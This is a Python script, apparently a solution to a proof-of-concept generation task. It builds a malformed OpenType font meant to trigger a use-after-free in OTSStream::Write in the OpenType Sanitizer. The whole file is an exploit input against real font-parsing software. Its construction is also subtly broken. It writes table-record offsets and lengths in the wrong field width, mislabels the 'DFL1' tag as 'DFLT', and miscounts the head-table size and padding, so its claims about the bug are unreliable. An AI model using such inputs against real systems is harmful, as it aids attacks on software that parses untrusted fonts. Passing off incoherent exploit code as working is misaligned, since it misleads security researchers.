class Solution:
    def solve(self, src_path: str) -> bytes:
        # Craft a minimal malformed OpenType font to trigger UAF in OTSStream::Write
        # Header: OTTO version, 2 tables (head and invalid table), adjusted offsets
        poc = b'OTTO'  # version 0x4F54544F
        poc += b'\x00\x02'  # num_tables = 2
        poc += b'\x00\x10'  # search_range = 16 (1<<4)
        poc += b'\x00\x04'  # entry_selector = 4
        poc += b'\x00\x04'  # range_shift = 4

        # Table 1: HEAD table record (checksum, offset, length)
        poc += b'head'  # tag
        poc += b'\xA3\x9F\x2D\xE3'  # checksum (dummy)
        poc += b'\x00\x40'  # offset = 64
        poc += b'\x00\x36'  # length = 54 (standard head size)

        # Table 2: Malformed table to trigger UAF (e.g., invalid GPOS with bad offsets)
        poc += b'GPOS'  # tag
        poc += b'\x00\x00\x00\x00'  # checksum 0
        poc += b'\x00\xA0'  # offset = 160 (after head + padding)
        poc += b'\x00\xFF'  # length = 255 (to cause buffer issues)

        # Padding to align tables (font data starts at 16 + 16*num_tables = 48, but adjust)
        poc += b'\x00' * (64 - 48)  # pad to offset 64

        # HEAD table content (standard but minimal)
        poc += b'\x00\x01\x00\x00'  # version
        poc += b'\x00\x00\x00\x00'  # fontRevision
        poc += b'\x00\x00\x00\x00'  # checkSumAdjustment
        poc += b'\x00\x00\x00\x00'  # magicNumber
        poc += b'\x00\x00\x00\x0F'  # flags
        poc += b'\x00\x00'  # created[0:2] (low words)
        poc += b'\x00\x00\x00\x00'  # created[2:4]
        poc += b'\x00\x00'  # modified[0:2]
        poc += b'\x00\x00\x00\x00'  # modified[2:4]
        poc += b'\x00\x01'  # xMin
        poc += b'\x00\x00'  # yMin
        poc += b'\x01\x00'  # xMax
        poc += b'\x00\x00'  # yMax
        poc += b'\x00\x00'  # macStyle
        poc += b'\x00\x05'  # lowestRecPPEM
        poc += b'\x00\x02'  # fontDirectionHint
        poc += b'\x00\x00\x00\x00'  # indexToLocFormat=0, glyphDataFormat=0
        poc += b'\x00\x00' * 13  # pad to 54 bytes (head is 54 bytes)

        # Padding to GPOS offset 160
        poc += b'\x00' * (160 - 64 - 54)

        # GPOS table: Version 1.0, but malformed ScriptList offset to cause UAF
        poc += b'\x00\x01\x00\x00'  # major/minor version
        poc += b'\x00\x02'  # ScriptList offset (relative, points after end)
        poc += b'\x00\x00'  # FeatureList offset = 0 (invalid, triggers issues)
        poc += b'\x00\x00'  # LookupList offset = 0
        # ScriptList: single script, but LangSys offset invalid
        poc += b'\x00\x01'  # num Scripts = 1
        poc += b'DFL1'  # tag DFLT
        poc += b'\x00\x06'  # Script offset = 6 (LangSys)
        poc += b'\x00\x00'  # padding
        # Default LangSys: but offset to non-existent
        poc += b'\x00\x00'  # LangSys offset = 0 (invalid)
        poc += b'\x00\x00'  # ReqFeatureIndex = 0
        poc += b'\x00\x01'  # FeatureCount = 1
        poc += b'\x00\x00'  # FeatureIndex = 0
        # Add junk to reach ~800 bytes, with offsets that free buffer then write
        poc += b'\x00' * (800 - len(poc))
        return poc
